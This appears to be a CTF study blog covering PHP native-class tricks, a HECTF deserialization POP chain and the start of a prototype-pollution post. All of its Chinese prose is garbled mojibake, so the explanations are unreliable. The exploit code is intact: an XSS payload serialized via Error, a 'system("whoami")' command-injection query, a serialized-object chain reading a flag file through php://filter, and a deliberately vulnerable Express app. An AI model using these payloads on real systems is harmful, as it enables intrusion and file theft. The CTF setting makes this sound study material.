<p><strong>PHP åŸç”ŸError&amp;Exceptionç±»(XSSå®ç°ä¸hashç»•è¿‡)</strong><br><strong>Errorå†…ç½®ç±»</strong></p>
<pre><code>é€‚ç”¨äºphp7
å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹
</code></pre>
<p>Errorç±»æ˜¯php çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªError ï¼Œåœ¨php7çš„æƒ…å†µä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºä»–å†…ç½®æœ‰ä¸€ä¸ª ______toString()æ–¹æ³•ï¼Œåœ¨ctfååºåˆ—åŒ–ä¸­ï¼Œå¦‚æœflagåœ¨cookieä¸­å¯ä»¥å°è¯•åˆ©ç”¨Errorå»è§¦å‘_____toString()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = unserialize($_GET[&#x27;xxh&#x27;]);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;&quot;);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p><strong>Excepthin å†…ç½®ç±»</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é€‚ç”¨äº php5ï¼Œ7</span><br><span class="line">å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰evalï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">eval(&quot;echo new $a($b());&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Error&amp;b=system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="ZipArchiveç±»"><a href="#ZipArchiveç±»" class="headerlink" title="ZipArchiveç±»"></a>ZipArchiveç±»</h4><p>å¯ä»¥é€šè¿‡æœ¬ç±»æ‰§è¡Œä¸€äº›æ–‡ä»¶æ“ä½œï¼Œåœ¨CTFå¯ä»¥ç”¨æ¥åˆ é™¤waf(åº”è¯¥æ˜¯æŒ‡ç§»é™¤é˜²ç«å¢™ï¼Œå¤ªé«˜ç«¯æ²¡è§è¿‡)</p>
<p>open(æ‰“å¼€ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$zip = new \ZipArchive;</span><br><span class="line">$zip-&gt;open(&#x27;test_new.zip&#x27;, \ZipArchive::CREATE)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::addEmptyDirï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•</span><br><span class="line">ZipArchive::addFileï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­</span><br><span class="line">ZipArchive::addFromStringï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»</span><br><span class="line">ZipArchive::closeï¼šå…³é—­ziparchive</span><br><span class="line">ZipArchive::extractToï¼šå°†å‹ç¼©åŒ…è§£å‹</span><br><span class="line">ZipArchive::openï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…</span><br><span class="line">ZipArchive::deleteIndexï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼šdeleteIndex(0)ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">ZipArchive::deleteNameï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>ä¾‹é¢˜</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">Welcome to HECTF Have fun!!!ğŸ˜Š</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">class A&#123;</span><br><span class="line">    public $file;</span><br><span class="line"> </span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;Welcome to HECTF Have fun!!!ğŸ˜Š&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(isset($this-&gt;file-&gt;var))&#123;</span><br><span class="line">            $this-&gt;file = &quot;flag.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $this-&gt;file = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        highlight_file($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class B&#123;</span><br><span class="line">    public $str;</span><br><span class="line">    public $huang;</span><br><span class="line">    public  function __isset($arg)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;éš¾é“æˆ‘çœŸçš„è¦å¤±è´¥äº†ï¼Œå—&quot;.$this-&gt;str;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($fun1,$arg)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;huang-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class C&#123;</span><br><span class="line">    public $eee;</span><br><span class="line">    public $aaa=&quot;who are you?&quot;;</span><br><span class="line">    public $ccc;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;eee-&gt;flag();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($css)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;ccc;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class D&#123;</span><br><span class="line">    private $ddd;</span><br><span class="line">    private $ext;</span><br><span class="line"> </span><br><span class="line">    public function flag()&#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;ddd);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo new $this-&gt;ddd($this-&gt;ext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$gagaga = new A();</span><br><span class="line">unserialize(serialize($gagaga));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$data = $_POST[&#x27;data&#x27;];</span><br><span class="line">unserialize($data); </span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸‹å±æ€§ï¼Œé™¤äº†Dé‡Œé¢æœ‰ä¸¤ä¸ªprivateï¼Œå…¶ä»–éƒ½æ˜¯public</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo new $this-&gt;ddd($this-&gt;ext);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™éƒ¨åˆ†å­˜åœ¨æ¼æ´â€œechoâ€¦â€ï¼Œç¼–å·ä¸ºpopé“¾.4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŠŠtestå½“æˆå‡½æ•°test()æ¥è°ƒç”¨,æ­¤æ—¶è§¦å‘invoke()</span><br></pre></td></tr></table></figure>

<p>å¦‚æ­¤ï¼Œæ‰¾åˆ°ä¸Šä¸€æ­¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __get($css)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;ccc;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨çš„æˆå‘˜å±æ€§ä¸å­˜åœ¨æ—¶è§¦å‘get__</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($this-&gt;file-&gt;var))&#123;</span><br><span class="line">            $this-&gt;file = &quot;flag.php&quot;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($fun1,$arg)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;huang-&gt;str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰ä¸Šè¿™ä¸¤ä¸ªéƒ½æœ‰å¯èƒ½</p>
<p>é—®äº†ä¸€ä¸‹chatï¼Œä»–è¯´ç¬¬ä¸€ä¸ªè¿™ä¸ªè§¦å‘ä¸äº†get()å› ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åœ¨PHPä¸­ï¼Œ__get() æ–¹æ³•çš„è§¦å‘æ˜¯åŸºäºå¯¹ä¸€ä¸ªä¸å¯è®¿é—®ï¼ˆç§æœ‰ã€ä¿æŠ¤æˆ–æœªå®šä¹‰ï¼‰å±æ€§çš„ç›´æ¥è®¿é—®ã€‚å½“ä½ å°è¯•è·å–ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§å€¼æ—¶ï¼Œå¦‚æœè¿™ä¸ªå±æ€§ä¸å¯ç›´æ¥è®¿é—®ï¼ˆæ¯”å¦‚å› ä¸ºå®ƒæ˜¯ç§æœ‰çš„æˆ–æ ¹æœ¬å°±ä¸å­˜åœ¨ï¼‰ï¼ŒPHPä¼šå°è¯•è°ƒç”¨è¯¥å¯¹è±¡çš„ __get() é­”æœ¯æ–¹æ³•ï¼ˆå¦‚æœå®šä¹‰äº†çš„è¯ï¼‰ï¼Œå¹¶å°†å±æ€§åä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿™ä¸ªæ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">ç›¸åï¼Œ__isset() æ–¹æ³•çš„è§¦å‘æ˜¯åŸºäºå¯¹ä¸€ä¸ªä¸å¯è®¿é—®å±æ€§çš„å­˜åœ¨æ€§æ£€æŸ¥ã€‚å½“ä½ ä½¿ç”¨ isset() æˆ– empty() å‡½æ•°æ¥æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ˜¯å¦è®¾ç½®ï¼ˆå³æ˜¯å¦å­˜åœ¨ä¸”å…¶å€¼ä¸æ˜¯ nullï¼‰æ—¶ï¼Œå¦‚æœè¿™ä¸ªå±æ€§ä¸å¯ç›´æ¥è®¿é—®ï¼ŒPHPä¼šå°è¯•è°ƒç”¨è¯¥å¯¹è±¡çš„ __isset() é­”æœ¯æ–¹æ³•ï¼ˆå¦‚æœå®šä¹‰äº†çš„è¯ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ï¼ŒåŸå›  __get() åœ¨è¿™ç§æƒ…å†µä¸‹ä¸ä¼šè¢«è§¦å‘çš„æ˜¯å› ä¸º isset() æ“ä½œå¹¶ä¸æ¶‰åŠè·å–å±æ€§çš„å€¼ï¼Œè€Œæ˜¯æ£€æŸ¥å±æ€§æ˜¯å¦å­˜åœ¨ä¸”å…¶å€¼ä¸ä¸º nullã€‚isset() çš„è¿™ç§è¡Œä¸ºæ„å‘³ç€å®ƒåªéœ€è¦ç¡®å®šå±æ€§çš„å­˜åœ¨æ€§å’Œéç©ºæ€§ï¼Œè€Œä¸éœ€è¦å®é™…è·å–å±æ€§çš„å€¼ã€‚å› æ­¤ï¼Œå½“ä½ ä½¿ç”¨ isset() æ¥æ£€æŸ¥ä¸€ä¸ªå±æ€§æ—¶ï¼ŒPHP å°†è°ƒç”¨ __isset() è€Œä¸æ˜¯ __get()ã€‚</span><br><span class="line"></span><br><span class="line">è¿™ç§è®¾è®¡å…è®¸å¼€å‘è€…åœ¨æ£€æŸ¥å±æ€§å­˜åœ¨æ€§æ—¶æä¾›è‡ªå®šä¹‰é€»è¾‘ï¼ŒåŒæ—¶ä¹Ÿé¿å…äº†åœ¨ä»…ä»…æƒ³è¦æ£€æŸ¥ä¸€ä¸ªå±æ€§æ˜¯å¦å­˜åœ¨æ—¶ä¸å¿…è¦åœ°è§¦å‘å±æ€§å€¼çš„è·å–è¿‡ç¨‹ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½æ¶‰åŠåˆ°å¤æ‚æˆ–å¼€é”€è¾ƒå¤§çš„è®¡ç®—ã€‚ç®€è€Œè¨€ä¹‹ï¼Œ__isset() å’Œ __get() åˆ†åˆ«é’ˆå¯¹ä¸åŒçš„æ“ä½œåœºæ™¯ï¼šå‰è€…ç”¨äºå­˜åœ¨æ€§æ£€æŸ¥ï¼Œåè€…ç”¨äºå€¼è·å–ã€‚</span><br></pre></td></tr></table></figure>

<p>æˆ‘éªŒè¯ä¸€ä¸‹å»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class T&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __isset($arg)&#123;</span><br><span class="line">        echo &#x27;isset&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($arg)&#123;</span><br><span class="line">        echo &#x27;get&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function A()&#123;isset($this-&gt;file-&gt;s);&#125;</span><br><span class="line">&#125;</span><br><span class="line">$T=new T;</span><br><span class="line">$T-&gt;file=new T;</span><br><span class="line">$T-&gt;A();</span><br><span class="line">//echo $T-&gt;file-&gt;b;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºissetï¼Œæ³¨é‡Šé‡Œé¢æ˜¯éªŒè¯ä¸€ä¸‹èƒ½ä¸èƒ½è§¦å‘get</p>
<p>è¿™ä¸‹ä¸€è¨€é¡¶çœŸäº†ï¼Œchaté è°±</p>
<p>é‚£ä¹ˆå†popé“¾é‡Œé¢ä¸Šä¸€æ­¥å°±ç¡®å®šäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($fun1,$arg)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;huang-&gt;str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">   		 $this-&gt;eee-&gt;flag();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echoæˆ–è€…printåªèƒ½è°ƒç”¨å­—ç¬¦ä¸²çš„æ–¹å¼å»è°ƒç”¨å¯¹è±¡ï¼Œå³æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œæ­¤æ—¶è‡ªåŠ¨è§¦å‘toString()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public  function __isset($arg)</span><br><span class="line">    &#123;</span><br><span class="line">   		 echo &quot;éš¾é“æˆ‘çœŸçš„è¦å¤±è´¥äº†ï¼Œå—&quot;.$this-&gt;str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;</span><br><span class="line">        if(isset($this-&gt;file-&gt;var))&#123;</span><br><span class="line">            $this-&gt;file = &quot;flag.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $this-&gt;file = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åˆ°wakeupå°±ç»“æŸäº†ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ¬¡è¦</p>
<p>A-&gt;B-&gt;C-&gt;B-&gt;C-&gt;D</p>
<p>å¾—åˆ°exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$d=new D;</span><br><span class="line">$d-&gt;ddd=&quot;SplFileObject&quot;;</span><br><span class="line">$d-&gt;ext=&quot;php://filter/read=convert.base64-encode/resource=../../../ffflllllaaaaaaggggg.txt&quot;;</span><br><span class="line">$c=new C;</span><br><span class="line">$c-&gt;ccc=$d;</span><br><span class="line">$b=new B;</span><br><span class="line">$b-&gt;huang=$c;</span><br><span class="line">$c1=new C;</span><br><span class="line">$c1-&gt;eee=$b;</span><br><span class="line">$b1=new B;</span><br><span class="line">$b1-&gt;str=$c1;</span><br><span class="line">$a=new A;</span><br><span class="line">$a-&gt;file=$b1;</span><br><span class="line">echo (serialize($a));</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯è¿˜æœ‰ä¸€ç‚¹æŠŠprivateçš„$dæ”¹é€ ä¸€ä¸‹</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clto5uldh000mtwb53j5573d1" data-title="åŸç”Ÿç±»" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-phototype-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/04/phototype-1/" class="article-date">
  <time class="dt-published" datetime="2024-03-04T15:54:20.000Z" itemprop="datePublished">2024-03-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/04/phototype-1/">phototype_1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>åŸå‹é“¾æ±¡æŸ“çš„æ¦‚å¿µäº†è§£çš„å·®ä¸å¤šäº†ï¼Œä½†æ˜¯å…·ä½“è€Œè¨€è¿˜ä¸å¤ªä¼šç”¨ï¼Œæ‰¾é“ä¾‹é¢˜çœ‹ä¸‹å…·ä½“å¦‚ä½•ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const session = require(&#x27;express-session&#x27;);</span><br><span class="line">const randomize = require(&#x27;randomatic&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        // Prevent prototype pollution</span><br><span class="line">        if (key === &#x27;__proto__&#x27;) &#123;</span><br><span class="line">            throw new Error(&quot;Detected Prototype Pollution&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .use(bodyParser.urlencoded(&#123;extended: true&#125;))</span><br><span class="line">    .use(bodyParser.json());</span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &quot;./views&quot;));</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: &#x27;session&#x27;,</span><br><span class="line">    secret: randomize(&#x27;aA0&#x27;, 16),</span><br><span class="line">    resave: false,</span><br><span class="line">    saveUninitialized: false</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.all(&quot;/login&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        // save userinfo to session</span><br><span class="line">        let data = &#123;&#125;;</span><br><span class="line">        try &#123;</span><br><span class="line">            merge(data, req.body)</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return res.render(&quot;login&quot;, &#123;message: &quot;Don&#x27;t pollution my shared diary!&quot;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.session.data = data</span><br><span class="line"></span><br><span class="line">        // check password</span><br><span class="line">        let user = &#123;&#125;;</span><br><span class="line">        user.password = req.body.password;</span><br><span class="line">        if (user.password=== &quot;testpassword&quot;) &#123;</span><br><span class="line">            user.role = &#x27;admin&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        if (user.role === &#x27;admin&#x27;) &#123;</span><br><span class="line">            req.session.role = &#x27;admin&#x27;</span><br><span class="line">            return res.redirect(&#x27;/&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            return res.render(&quot;login&quot;, &#123;message: &quot;Login as admin or don&#x27;t touch my shared diary!&quot;&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.render(&#x27;login&#x27;, &#123;message: &quot;&quot;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    if (!req.session.data || !req.session.data.username || req.session.role !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        return res.redirect(&quot;/login&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        let diary = ejs.render(`&lt;div&gt;$&#123;req.body.diary&#125;&lt;/div&gt;`)</span><br><span class="line">        req.session.diary = diary</span><br><span class="line">        return res.render(&#x27;diary&#x27;, &#123;diary: req.session.diary, username: req.session.data.username&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    return res.render(&#x27;diary&#x27;, &#123;diary: req.session.diary, username: req.session.data.username&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(8888, &#x27;0.0.0.0&#x27;);</span><br></pre></td></tr></table></figure>

